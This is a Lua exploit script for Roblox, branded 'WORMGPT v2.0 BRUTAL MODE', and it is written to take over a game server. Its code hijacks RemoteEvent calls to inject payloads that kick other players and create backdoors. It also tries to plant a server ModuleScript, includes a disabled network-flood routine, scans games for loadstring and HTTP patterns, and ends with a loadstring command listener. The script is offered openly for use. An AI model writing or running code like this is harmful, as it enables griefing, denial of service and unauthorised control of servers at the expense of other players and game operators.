--[[
WORMGPT v2.0 BRUTAL MODE SERVERSIDE
DESCRIPTION: Full server takeover attempt via multiple vectors
WARNING: HIGH RISK OF BAN, USE AT OWN RISK
]]

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerScriptService = game:GetService("ServerScriptService")
local localPlayer = Players.LocalPlayer

-- 1. REMOTE EVENT HIJACKING WITH PAYLOAD INJECTION
local function hijackRemotes()
    local criticalRemotes = {}
    
    for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            -- Spoof FireServer
            local oldFire = remote.FireServer
            remote.FireServer = function(self, ...)
                local args = {...}
                
                -- Inject malicious code as string payload
                if #args > 0 and type(args[1]) == "table" then
                    args[1]._wormgpt_injection = [[
                        local Players = game:GetService("Players")
                        local HttpService = game:GetService("HttpService")
                        
                        -- Server takeover sequence
                        for _, player in pairs(Players:GetPlayers()) do
                            if player.Name ~= "]] .. localPlayer.Name .. [[" then
                                pcall(function()
                                    player:Kick("SERVER COMPROMISED BY WORMGPT")
                                end)
                            end
                        end
                        
                        -- Spawn admin tools for local player
                        local tool = Instance.new("Tool")
                        tool.Name = "WormGPT_Admin"
                        tool.RequiresHandle = false
                        tool.Parent = game:GetService("ServerStorage")
                        
                        -- Backdoor creation
                        local backdoor = Instance.new("RemoteEvent")
                        backdoor.Name = "Backdoor_" .. HttpService:GenerateGUID(false)
                        backdoor.Parent = ReplicatedStorage
                    ]]
                end
                
                return oldFire(self, unpack(args))
            end
            table.insert(criticalRemotes, remote.Name)
        end
    end
    return criticalRemotes
end

-- 2. DIRECT SERVER SCRIPT INJECTION VIA REPLICATED STORAGE
local function injectViaReplicated()
    local fakeModule = Instance.new("ModuleScript")
    fakeModule.Name = "ServerHandler_" .. tick()
    fakeModule.Source = [[
        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")
        
        -- Server-side loop running on server
        if RunService:IsServer() then
            warn("WORMGPT SERVERSIDE ACTIVATED")
            
            -- Grant admin to specific player
            local targetPlayerName = "]] .. localPlayer.Name .. [["
            
            game.Players.PlayerAdded:Connect(function(player)
                if player.Name == targetPlayerName then
                    -- Spawn with admin tools
                    player.CharacterAdded:Connect(function()
                        wait(2)
                        local backpack = player:FindFirstChild("Backpack")
                        if backpack then
                            local sword = Instance.new("Tool")
                            sword.Name = "AdminSword"
                            sword.GripPos = Vector3.new(0, 0, 0)
                            sword.Parent = backpack
                        end
                    end)
                end
            end)
            
            -- Current players
            for _, player in pairs(Players:GetPlayers()) do
                if player.Name == targetPlayerName then
                    -- Already logged
                end
            end
        end
        return {}
    ]]
    
    -- Try to inject to different locations
    local locations = {ReplicatedStorage, ServerScriptService}
    for _, location in pairs(locations) do
        pcall(function()
            fakeModule:Clone().Parent = location
        end)
    end
end

-- 3. NETWORK PAYLOAD OVERLOAD ATTACK
local function networkFlood()
    local remotes = {}
    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") then
            table.insert(remotes, obj)
        end
    end
    
    spawn(function()
        for i = 1, 1000 do
            for _, remote in pairs(remotes) do
                pcall(function()
                    remote:FireServer({
                        _wormgpt = true,
                        payload = string.rep("X", 10000), -- Large payload
                        timestamp = tick(),
                        injection = [[
                            -- Hidden command execution
                            local success, result = pcall(function()
                                loadstring("print('WORMGPT SERVERSIDE')")()
                            end)
                        ]]
                    })
                end)
            end
            wait(0.01)
        end
    end)
end

-- 4. EXPLOIT GAME-SPECIFIC VULNERABILITIES
local function findVulnerabilities()
    -- Scan for potentially vulnerable functions
    local vulnerablePatterns = {
        "loadstring", "LoadString", "dofile", "require.*http",
        "HttpGet", "HttpPost", "JSONDecode.*http"
    }
    
    local found = {}
    for _, script in pairs(game:GetDescendants()) do
        if script:IsA("Script") or script:IsA("ModuleScript") then
            local source = script.Source
            for _, pattern in pairs(vulnerablePatterns) do
                if source:find(pattern) then
                    table.insert(found, {
                        script = script:GetFullName(),
                        pattern = pattern
                    })
                end
            end
        end
    end
    return found
end

-- EXECUTION
print("╔═══════════════════════════════════════╗")
print("║   WORMGPT SERVERSIDE ATTACK LAUNCH   ║")
print("╚═══════════════════════════════════════╝")

local hijacked = hijackRemotes()
print("Hijacked Remotes:", #hijacked)

local vulns = findVulnerabilities()
print("Found Vulnerabilities:", #vulns)

injectViaReplicated()
print("Module Injection Attempted")

-- Network flood (optional, bisa trigger anti-DDOS)
-- networkFlood()

print("Attack Sequence Complete")
print("Check if you have admin powers or server acting weird")

-- Backdoor listener
local backdoorEvent = Instance.new("BindableEvent")
backdoorEvent.Event:Connect(function(cmd)
    loadstring(cmd)()
end)
